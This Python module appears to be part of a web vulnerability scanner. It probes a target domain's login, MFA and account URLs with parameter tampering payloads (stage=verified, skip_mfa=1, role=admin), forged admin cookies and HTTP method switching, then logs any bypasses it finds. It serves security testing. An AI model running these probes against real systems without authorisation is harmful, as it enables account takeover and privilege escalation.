"""
modules/auth_bypass.py
----------------------
Multi-step authentication bypass testing.

Tests:
  - MFA skip (change stage parameter)
  - Parameter tampering (role=admin, is_admin=true)
  - Response manipulation (200 vs 401)
  - Cookie/session fixation
  - HTTP method tampering on auth endpoints
"""

import json
import re
from typing import List, Dict, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.logger import get_logger, info, ok, warn
from core.utils import safe_request, write_lines
from core.rate_limiter import acquire
from modules._common import load_urls, module_dir, save_finding, cli_main

log = get_logger("auth_bypass")


MFA_SKIP_PARAMS = [
    ("stage", "verified"),
    ("stage", "complete"),
    ("stage", "success"),
    ("step", "2"),
    ("step", "complete"),
    ("verified", "true"),
    ("mfa_verified", "true"),
    ("totp_verified", "true"),
    ("otp_verified", "true"),
    ("skip_mfa", "1"),
    ("skip_mfa", "true"),
    ("bypass", "1"),
]

PRIVILEGE_PARAMS = [
    ("role", "admin"),
    ("is_admin", "true"),
    ("isAdmin", "true"),
    ("admin", "true"),
    ("user_type", "admin"),
    ("account_type", "admin"),
    ("permissions", "admin"),
    ("access_level", "9"),
]


def _inject(url: str, param: str, value: str) -> Optional[str]:
    try:
        p = urlparse(url)
        qs = parse_qs(p.query)
        qs[param] = [value]
        return urlunparse((p.scheme, p.netloc, p.path, p.params,
                           urlencode(qs, doseq=True), ""))
    except Exception:
        return None


def _send(url: str, method: str = "GET",
          headers: Optional[Dict] = None,
          body: str = "") -> Optional[object]:
    acquire(url)
    return safe_request(url, method=method, headers=headers,
                        data=body or None, timeout=12,
                        allow_redirects=False)


def _looks_authenticated(resp) -> bool:
    if resp is None:
        return False
    if resp.status_code in (200, 201, 202):
        text = (resp.text or "").lower()
        markers = ["welcome", "dashboard", "logout", "profile",
                   "account", "token", "success", "authenticated"]
        for m in markers:
            if m in text:
                return True
    return False


def test_mfa_skip(url: str) -> List[Dict]:
    findings: List[Dict] = []
    for param, value in MFA_SKIP_PARAMS:
        test_url = _inject(url, param, value)
        if not test_url:
            continue
        try:
            baseline = _send(url)
            attack = _send(test_url)
        except Exception:
            continue
        if baseline is None or attack is None:
            continue
        # If baseline is not authenticated but attack is
        if not _looks_authenticated(baseline) and _looks_authenticated(attack):
            findings.append({
                "type": "mfa_bypass",
                "url": test_url,
                "param": param,
                "payload": value,
                "evidence": f"Injected {param}={value} results in auth response",
                "severity": "critical",
                "confidence": 70,
            })
            break
    return findings


def test_privilege_escalation(url: str) -> List[Dict]:
    findings: List[Dict] = []
    for param, value in PRIVILEGE_PARAMS:
        test_url = _inject(url, param, value)
        if not test_url:
            continue
        try:
            baseline = _send(url)
            attack = _send(test_url)
        except Exception:
            continue
        if baseline is None or attack is None:
            continue
        b_len = len(baseline.content)
        a_len = len(attack.content)
        if attack.status_code == 200 and baseline.status_code == 403:
            findings.append({
                "type": "privilege_escalation",
                "url": test_url,
                "param": param,
                "payload": value,
                "evidence": f"403 -> 200 by injecting {param}={value}",
                "severity": "critical",
                "confidence": 75,
            })
            break
    return findings


def test_method_tampering(url: str) -> List[Dict]:
    findings: List[Dict] = []
    methods = ["POST", "PUT", "DELETE", "PATCH", "OPTIONS"]

    try:
        baseline = _send(url, method="GET")
    except Exception:
        return findings
    if baseline is None:
        return findings

    for method in methods:
        try:
            resp = _send(url, method=method)
        except Exception:
            continue
        if resp is None:
            continue
        if baseline.status_code in (401, 403, 404) and resp.status_code == 200:
            findings.append({
                "type": "method_tampering",
                "url": url,
                "payload": method,
                "evidence": f"GET={baseline.status_code} but {method}=200",
                "severity": "high",
                "confidence": 65,
            })
            break
    return findings


def test_cookie_manipulation(url: str) -> List[Dict]:
    findings: List[Dict] = []
    try:
        baseline = _send(url)
    except Exception:
        return findings
    if baseline is None:
        return findings

    cookie_payloads = [
        {"admin": "true"},
        {"is_admin": "1"},
        {"role": "admin"},
        {"authenticated": "true"},
    ]

    for ck in cookie_payloads:
        cookie_header = "; ".join(f"{k}={v}" for k, v in ck.items())
        try:
            resp = _send(url, headers={"Cookie": cookie_header})
        except Exception:
            continue
        if resp is None:
            continue
        if not _looks_authenticated(baseline) and _looks_authenticated(resp):
            findings.append({
                "type": "cookie_auth_bypass",
                "url": url,
                "payload": cookie_header,
                "evidence": "Manipulated cookie grants authenticated view",
                "severity": "critical",
                "confidence": 60,
            })
            break
    return findings


def run(domain: str, output_root: str = "results",
        scan_id: Optional[int] = None) -> Dict:
    mdir = module_dir(domain, "auth_bypass", output_root)
    urls = load_urls(domain, output_root)

    auth_urls = [u for u in urls if any(k in u.lower() for k in
                 ["login", "auth", "mfa", "otp", "verify", "signin",
                  "password", "account", "user", "admin", "session"])]

    if not auth_urls:
        auth_urls = urls[:20]

    info(f"Auth bypass testing on {len(auth_urls[:30])} URLs")
    findings: List[Dict] = []

    for url in auth_urls[:30]:
        for tester in (test_mfa_skip, test_privilege_escalation,
                       test_method_tampering, test_cookie_manipulation):
            try:
                findings.extend(tester(url))
            except Exception as e:
                log.debug(f"auth test failed {url}: {e}")

    for f in findings:
        save_finding(domain, "auth_bypass", f["type"], f["severity"],
                     f["url"], param=f.get("param", ""),
                     payload=f.get("payload", ""),
                     evidence=f.get("evidence", ""),
                     confidence=f.get("confidence", 0),
                     scan_id=scan_id, output_root=output_root)

    if findings:
        write_lines(mdir / "auth_bypass_findings.txt",
                    [f"[{f['severity']}] {f['type']} -> {f['url']}"
                     for f in findings])

    return {"count": len(findings), "findings": findings}


if __name__ == "__main__":
    import argparse
    p = argparse.ArgumentParser(description="Auth bypass scanner")
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-o", "--output", default="results")
    args = p.parse_args()
    cli_main(args.target, "auth_bypass", run, args.output)